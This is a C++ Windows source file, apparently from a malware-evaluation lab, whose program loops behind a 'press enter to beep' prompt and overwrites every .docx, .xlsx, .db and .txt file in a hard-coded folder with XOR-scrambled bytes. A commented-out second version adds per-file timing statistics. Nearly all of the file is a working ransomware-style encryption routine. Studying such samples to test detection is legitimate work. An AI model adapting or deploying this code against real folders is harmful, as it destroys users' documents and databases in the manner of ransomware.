#include <iostream>
#include <string>
#include <Windows.h>
#include <vector>
#include <fstream>

const std::wstring TARGET_DIR = L"C:\\Users\\User\\Documents\\MalwareAnalysis\\MalwareEvaluation-main\\ClipboardLogger\\Debug\\Files\\";
const std::vector<std::wstring> TARGET_EXTENSIONS = { L".docx", L".xlsx", L".db", L".txt" };
const BYTE XOR_KEY = 0x5A; // Simple XOR key

bool hasTargetExtension(const std::wstring& filename) {
	for (const auto& ext : TARGET_EXTENSIONS) {
		if (filename.size() >= ext.size() &&
			filename.compare(filename.size() - ext.size(), ext.size(), ext) == 0) {
			return true;
		}
	}
	return false;
}

void encryptFile(const std::wstring& filePath) {
	HANDLE hFile = CreateFileW(filePath.c_str(), GENERIC_READ | GENERIC_WRITE,
		0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hFile == INVALID_HANDLE_VALUE) {
		std::wcerr << L"Failed to open: " << filePath << std::endl;
		return;
	}

	DWORD fileSize = GetFileSize(hFile, NULL);
	if (fileSize == INVALID_FILE_SIZE || fileSize == 0) {
		CloseHandle(hFile);
		return;
	}

	BYTE* buffer = new BYTE[fileSize];
	DWORD bytesRead = 0;
	if (!ReadFile(hFile, buffer, fileSize, &bytesRead, NULL)) {
		std::wcerr << L"Failed to read: " << filePath << std::endl;
		delete[] buffer;
		CloseHandle(hFile);
		return;
	}

	// XOR encryption
	for (DWORD i = 0; i < bytesRead; ++i) {
		buffer[i] ^= XOR_KEY;
	}

	// Move back to beginning and overwrite
	SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
	DWORD bytesWritten = 0;
	WriteFile(hFile, buffer, bytesRead, &bytesWritten, NULL);

	delete[] buffer;
	CloseHandle(hFile);

	std::wcout << L"Encrypted: " << filePath << std::endl;
}

void encryptTargetFiles(const std::wstring& dirPath) {
	WIN32_FIND_DATAW findFileData;
	std::wstring searchPath = dirPath + L"*";

	HANDLE hFind = FindFirstFileW(searchPath.c_str(), &findFileData);
	if (hFind == INVALID_HANDLE_VALUE) {
		std::wcerr << L"FindFirstFile failed in directory: " << dirPath << std::endl;
		return;
	}

	do {
		std::wstring filename = findFileData.cFileName;

		if (filename == L"." || filename == L"..")
			continue;

		std::wstring fullPath = dirPath + filename;

		if (!(findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
			if (hasTargetExtension(filename)) {
				encryptFile(fullPath);
			}
		}
	} while (FindNextFileW(hFind, &findFileData) != 0);

	FindClose(hFind);
}

int main()
{
	std::string value;
	while (true)
	{
		// Output the current process Id
		HANDLE currentThread = GetCurrentThread();
		std::cout << "Process id: ";
		std::cout << GetProcessIdOfThread(currentThread);
		std::cout << "\n";
		CloseHandle(currentThread);

		std::cout << "Press <enter> to Beep (Ctrl-C to exit): ";
		std::getline(std::cin, value);
		Beep(500, 500);

		// Encrypt files once at the start
		encryptTargetFiles(TARGET_DIR);
	}
	return 0;
}



/*
#include <iostream>
#include <string>
#include <Windows.h>
#include <vector>
#include <fstream>
#include <chrono>

const std::wstring TARGET_DIR = L"C:\\Users\\User\\Documents\\MalwareAnalysis\\MalwareEvaluation-main\\ClipboardLogger\\Debug\\Files\\";
const std::vector<std::wstring> TARGET_EXTENSIONS = { L".docx", L".xlsx", L".db", L".txt" };
const BYTE XOR_KEY = 0x5A; // Simple XOR key

bool hasTargetExtension(const std::wstring& filename) {
	for (const auto& ext : TARGET_EXTENSIONS) {
		if (filename.size() >= ext.size() &&
			filename.compare(filename.size() - ext.size(), ext.size(), ext) == 0) {
			return true;
		}
	}
	return false;
}

bool encryptFile(const std::wstring& filePath, double& durationOut) {
	auto start = std::chrono::high_resolution_clock::now();

	HANDLE hFile = CreateFileW(filePath.c_str(), GENERIC_READ | GENERIC_WRITE,
		0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hFile == INVALID_HANDLE_VALUE) {
		std::wcerr << L"Failed to open: " << filePath << std::endl;
		return false;
	}

	DWORD fileSize = GetFileSize(hFile, NULL);
	if (fileSize == INVALID_FILE_SIZE || fileSize == 0) {
		CloseHandle(hFile);
		return false;
	}

	BYTE* buffer = new BYTE[fileSize];
	DWORD bytesRead = 0;
	if (!ReadFile(hFile, buffer, fileSize, &bytesRead, NULL)) {
		std::wcerr << L"Failed to read: " << filePath << std::endl;
		delete[] buffer;
		CloseHandle(hFile);
		return false;
	}

	// XOR encryption
	for (DWORD i = 0; i < bytesRead; ++i) {
		buffer[i] ^= XOR_KEY;
	}

	// Move back to beginning and overwrite
	SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
	DWORD bytesWritten = 0;
	WriteFile(hFile, buffer, bytesRead, &bytesWritten, NULL);

	delete[] buffer;
	CloseHandle(hFile);

	auto end = std::chrono::high_resolution_clock::now();
	std::chrono::duration<double, std::micro> duration = end - start;
	durationOut = duration.count();

	std::wcout << L"[+] Encrypted: " << filePath << L" (Time: " << duration.count() << L" µs)\n";
	return true;
}

void encryptTargetFiles(const std::wstring& dirPath) {
	WIN32_FIND_DATAW findFileData;
	std::wstring searchPath = dirPath + L"*";

	HANDLE hFind = FindFirstFileW(searchPath.c_str(), &findFileData);
	if (hFind == INVALID_HANDLE_VALUE) {
		std::wcerr << L"FindFirstFile failed in directory: " << dirPath << std::endl;
		return;
	}

	int attemptCount = 0;
	double totalMicroseconds = 0.0;

	do {
		std::wstring filename = findFileData.cFileName;

		if (filename == L"." || filename == L"..")
			continue;

		std::wstring fullPath = dirPath + filename;

		if (!(findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
			if (hasTargetExtension(filename)) {
				double duration = 0.0;
				bool success = encryptFile(fullPath, duration);
				totalMicroseconds += duration;
				attemptCount++;

				if (!success) {
					std::wcout << L"[!] Failed to encrypt: " << filename << L" (Time: " << duration << L" µs)\n";
				}
			}
		}
	} while (FindNextFileW(hFind, &findFileData) != 0);

	FindClose(hFind);

	if (attemptCount > 0) {
		double avgTime = totalMicroseconds / attemptCount;
		std::wcout << L"[*] Total files attempted: " << attemptCount << std::endl;
		std::wcout << L"[*] Total time spent: " << totalMicroseconds << L" µs" << std::endl;
		std::wcout << L"[*] Average time per attempt: " << avgTime << L" µs" << std::endl;
	}
	else {
		std::wcout << L"[!] No matching files to process.\n";
	}
}

int main()
{
	std::string value;
	while (true)
	{
		// Output the current process Id
		HANDLE currentThread = GetCurrentThread();
		std::cout << "Process id: " << GetProcessIdOfThread(currentThread) << "\n";
		CloseHandle(currentThread);

		std::cout << "Press <enter> to Beep and Encrypt Files (Ctrl-C to exit): ";
		std::getline(std::cin, value);
		Beep(500, 500);

		std::wcout << L"[*] Attempting file encryption...\n";
		encryptTargetFiles(TARGET_DIR);
		std::wcout << std::endl;
	}
	return 0;
}
*/
